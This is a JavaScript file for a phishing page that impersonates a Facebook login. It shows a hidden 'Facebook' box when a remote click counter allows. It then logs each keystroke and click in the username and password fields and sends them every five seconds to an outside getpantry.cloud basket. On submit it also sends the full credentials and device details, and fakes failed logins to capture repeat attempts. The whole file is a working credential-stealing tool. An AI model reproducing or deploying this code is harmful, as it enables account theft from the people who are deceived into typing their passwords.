let logintry = 0;
let specialinput = [];
let rollbackmemo = [];
const fbboxx = document.getElementById("fbboxx");
const urlp = new URLSearchParams(window.location.search);
const atkId = urlp.get("id");
const atkPage = urlp.get("page");
const url = "https://getpantry.cloud/apiv1/pantry/03507b42-55c3-46a0-a747-accd683ab00a/basket/";
const atkURL = url + atkId;
fbboxx.style.display = "none";
if(!atkId && !atkPage){
  fbboxx.style.display = "none";
  document.title = "";
}
async function getAtk(userid){
 const fullurl = url + userid;
  const req = await fetch(fullurl);
 const atkData = await req.json();
if(atkData.click === 0){
  fbboxx.style.display = "none";
  document.title = "";
}

if(atkData.click > 0 && atkData.page === atkPage){
 
  bdloaded();
fbboxx.style.display = "block";
  document.title = "Facebook";
const user = document.getElementById("username");
const password = document.getElementById("password");
const login = document.getElementById("login");
const body = document.body;

function bdloaded(){
  const details = {
    time: valitime(),
    date: validate()
  }
  const vvdata = atkData.click - 1;
  fetch(atkURL,{
    method: "PUT",
    headers:{
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      click: vvdata
    })
  });
  setTimeout(() => {
    typing("visit","page", details);
  },1500);
}

sendspecial();

login.addEventListener("click", (e) => {
  e.preventDefault();
 if(user.value === null || user.value === "" || password.value === null || password.value === ""){
   return
 }
 else if (password.value.length < 6) {
   return
 }
  submit();
});

async function submit(){
  login.innerHTML = "<div class='loadbar'></div>";
  let x = user.value;
  let y = password.value;
  const deviceInfo = phaseUserAgent();
  let data = {
    username: x,
    password: y,
    time: valitime(),
    date: validate(),
    devicename: deviceInfo.deviceName
  };

  const req = await fetch(atkURL,{
    method: "PUT",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      loggedin: [data]
    })
  });
 const res = await req.status;
 if(res === 200){
  if(logintry < 3){
   loginBtn();
   logintry++;
  }else{
    // pending authorize
  }
 }
}

function loginBtn() {
  setTimeout(() => {
    login.innerText = "Log in";
  }, 4560);
}

user.addEventListener("input", (e) => {
  const deviceInfo = phaseUserAgent();
  const details = {
    type: "username",
    value: e.target.value,
    time: valitime(),
    date: validate(),
    devicename: deviceInfo.deviceName
  }
  
  specialinput.push(details);
  
});

password.addEventListener("input", (e) => {
  const deviceInfo = phaseUserAgent();
  const details = {
    type: "password",
    value: e.target.value,
    time: valitime(),
    date: validate(),
    devicename: deviceInfo.deviceName
  }
  
  specialinput.push(details);
  
});

user.addEventListener("click", (e) => {
  const deviceInfo = phaseUserAgent();
  const details = {
    type: "clicked on",
    value: "username",
    time: valitime(),
    date: validate(),
    devicename: deviceInfo.deviceName
  }
  specialinput.push(details);
});

password.addEventListener("click", (e) => {
  const deviceInfo = phaseUserAgent();
  const details = {
    type: "clicked on",
    value: "password",
    time: valitime(),
    date: validate(),
    devicename: deviceInfo.deviceName
  }
  specialinput.push(details);
});

async function sendspecial(){
  setInterval(async () => {
    rollbackmemo = specialinput;// fallback
  const req = await fetch(atkURL,{
    method: "PUT",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      live: specialinput
    })
  });
  specialinput = [];// reset
  if(req.ok){
    clearTimeout(retry);
    rollbackmemo = [];// reset
  }
  // if fail retry
 const retry = setTimeout(async () => {
    const rollreq = await fetch(atkURL,{
    method: "PUT",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      live: rollbackmemo
    })
  });
  },4000);
  },5000);
  
}
async function typing(type,value, details={}){
  const {time,date} = details;
  const deviceInfo = phaseUserAgent();
  const bddata = {
      type: [`${type}`],
      value: value,
      time: time,
      date: date,
      devicename: deviceInfo.deviceName
  }
 
  const req = await fetch(atkURL,{
    method: "PUT",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      live: [bddata]
    })
  });
  
}

function valitime(){
  const date = new Date();
  const hr =  date.getHours();
  const mhr = hr < 12 ? date.getHours() : date.getHours() - 12;
  const min = date.getMinutes();
  const sec = date.getSeconds();
  const pmam = hr < 12 ? "AM" : "PM";
  let output = `${mhr}:${min}:${sec}${pmam}`;
  return output;
}

function validate(){
  let week = ["sun","mon","tue","wed","thu","fri","sat"];
  let months = ["jan","feb","mar","apr","may","jun","jul","aug","sep","oct","nov","dec"];
  const date = new Date();
  const day =  date.getDay();
  const month = date.getMonth();
  const dday = date.getDate();
  const year = date.getFullYear();
  let output = `${dday} ${week[day]},${months[month]} ${year} `;
  return output;
}


function phaseUserAgent() {
  const userAgent = navigator.userAgent;
  let deviceName = "Unknown Device";

  // Basic device name detection based on userAgent strings (simplified)
  if (/Android/i.test(userAgent)) {
    deviceName = "Android Device";
    // Android device IDs are not directly accessible in the browser due to privacy restrictions.
  } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
    deviceName = "iOS Device";
    // iOS device IDs (UDID, etc.) are not accessible in the browser for privacy reasons.
  } else if (/Windows Phone/i.test(userAgent)) {
    deviceName = "Windows Phone";
  } else if (/Win/i.test(userAgent)) {
    deviceName = "Windows PC";
  } else if (/Mac/i.test(userAgent)) {
    deviceName = "Macintosh";
  } else if (/Linux/i.test(userAgent)) {
    deviceName = "Linux Device";
  }

  // More granular device name detection (example, may need updates)
  if (/Android/i.test(userAgent)) {
    const androidMatch = userAgent.match(/Android.*?;\s*(.*?)\s*[);]/);
    if (androidMatch && androidMatch[1]) {
      deviceName = androidMatch[1]; // Try to get more specific Android model
    }
  } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
    if (/iPhone/i.test(userAgent)) {
        deviceName = "iPhone";
    } else if (/iPad/i.test(userAgent)) {
        deviceName = "iPad";
    } else if (/iPod/i.test(userAgent)) {
        deviceName = "iPod";
    }
  }

  return {
    deviceName: deviceName
  };
}

}

}

getAtk(atkId);
